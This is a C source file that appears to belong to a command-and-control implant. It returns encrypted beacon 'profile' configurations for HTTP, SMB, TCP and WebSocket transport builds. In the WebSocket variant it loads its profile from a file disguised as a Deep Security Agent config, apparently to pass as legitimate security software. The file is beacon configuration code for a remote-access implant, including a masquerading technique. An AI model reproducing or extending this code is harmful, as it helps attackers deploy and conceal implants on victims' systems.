#include "config.h"

#if defined(BUILD_SVC)
char* getServiceName()
{
	return (char*) "ServiceName";
}
#endif

#if defined(BEACON_HTTP) 
char* getProfile()
{
    return (char*)"\xa6\x00\x00\x00\x77\x29\xe3\xaa\x62\x5b\x03\x89\x8c\xa0\xee\xa7\x9c\x24\x89\x0b\xce\x64\x81\xd4\x9b\xd5\x04\x00\x2d\x6f\xb8\x8d\xce\xb2\xfb\x30\xd9\xaa\x31\x4f\x78\xc7\x03\xfd\x74\x32\xa5\xec\xb9\x93\x4b\xc5\xcf\x43\xb3\x24\x1d\x97\xaa\x88\x9c\xd6\xff\xb6\x87\x96\x2a\x78\x70\xa0\x1a\xae\x24\xa7\x78\xca\x5c\xf2\xaa\x6d\x6d\x50\x16\x3a\x26\x5b\x0b\x84\xa8\xc4\x4f\x7e\xba\xc8\xef\x4e\x01\x8a\x09\x42\xd6\x05\xa0\x4b\x32\x30\xa5\xd3\x71\x8d\xf8\x95\x33\x9d\x33\x8d\x20\xad\x64\xfb\xaa\x53\x92\xba\x14\xa0\x2d\x35\xde\x7b\xf1\x95\x6a\x05\xe2\xc1\x7d\xa2\x88\xce\xe4\x63\x59\xca\x60\x4c\x8e\x98\xa3\xb0\x88\x53\x37\xa0\xa6\x3e\x23\xdc\xff\x5e\xe4\x91\x34\x18\xf6\x08\x8f\xdd\xf2\x0d\x22\x92\xcf\xb6\x75\xe8\x91\x9a\xf6\x31\x62\x06\xf1\xe3\x47\xca";
}

unsigned int getProfileSize()
{
	return 186;
}

#elif defined(BEACON_SMB) 

char* getProfile()
{
	return (char*)"\x23\x00\x00\x00\x0a\x2f\x31\xaf\x97\x34\x3a\xce\x85\x7c\xaf\x89\x81\xcb\xc1\x09\xd5\xbd\xfb\x40\xfe\x6b\x03\x95\x72\xae\x28\x61\xf0\x90\x6e\x92\x6b\x60\x3d\x5f\x76\x23\x34\x64\x33\x6d\xa0\xb2\x14\x1b\x1c\xf9\xe1\x49\x34";
}

unsigned int getProfileSize()
{
	return 56;
}

#elif defined(BEACON_TCP) 

char* getProfile()
{
	return (char*)"\x14\x00\x00\x00\xdb\x91\x88\xbc\xde\x20\x93\xac\x2b\xca\x1d\x02\xcc\x92\xca\x88\x61\xa3\x33\x32\x25\xde\xcb\x26\xe0\x31\x57\xd0\x85\x4c\xe1\x76\xf5\xab\x89\xdf";
}

unsigned int getProfileSize()
{
	return 41;
}



//ws
#elif defined(BEACON_WS)
//char* getProfile()
//{
//	return (char*)"\x43\x00\x00\x00\x29\x12\xce\x5b\x64\xa6\x5a\x46\x0a\xbb\xd1\x94\x2a\x4e\x26\x24\xfc\xab\xdd\x4a\x17\xbd\xfe\xcb\x4a\x21\x86\xd8\xb4\x1e\x84\x2f\xbe\x80\xcb\xd4\x87\x2e\x30\x3a\x5f\xb3\xfc\xc4\x55\x63\x18\xd5\x84\x78\x49\x1d\x6d\x2c\x9f\x2a\x9a\x92\x50\xdf\x14\x61\x91\x82\x06\x41\x59\xe6\xa4\x7e\x01\x4a\x68\x64\x30\x9a\x5a\xed\x7c\xf3\x45\x7b\x50";
//}
//
//unsigned int getProfileSize()
//{
//	return 87;
//}

#include <windows.h>    

static BYTE* profileData = NULL;
static unsigned int profileSize = 0;

char* getProfile()
{
    if (profileData == NULL) {
        const char* configPath = "C:\\ProgramData\\Deep Security Agent\\config.ini";
        HANDLE hFile = CreateFileA(configPath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE) {
            return NULL;
        }

        profileSize = GetFileSize(hFile, NULL);
        profileData = (BYTE*)LocalAlloc(LPTR, profileSize);

        DWORD bytesRead;
        ReadFile(hFile, profileData, profileSize, &bytesRead, NULL);
        CloseHandle(hFile);
    }
    return (char*)profileData;
}

unsigned int getProfileSize()
{
    if (profileData == NULL) {
        getProfile();
    }
    return profileSize;
}
#endif

//#elif defined(BEACON_WS)
//char* getProfile()
//{
//	return (char*)"\x44\x00\x00\x00\x29\x12\xce\x5b\x64\xa6\x5a\x46\x0a\xbc\xd1\x94\x2a\x1b\x76\x6b\xbb\xf4\x85\x19\x17\xe7\xa8\x88\xe3\xaf\x99\xd8\xb0\x1a\x84\x2f\x91\xd8\xcf\xd4\xff\x25\x30\x3a\x12\x91\xe9\xd7\x50\x63\x15\x9b\x9e\x63\x57\x2d\x6d\x2c\x9f\x2a\x9a\x92\x50\xda\x11\x61\x91\x88\x0c\x41\x59\x7e\xe6\xa4\x7e\x01\x4a\x68\x64\x30\x9a\x5a\xed\x7c\xf3\x45\x7b\x50";
//}
//
//unsigned int getProfileSize()
//{
//	return 88;
//}
//#endif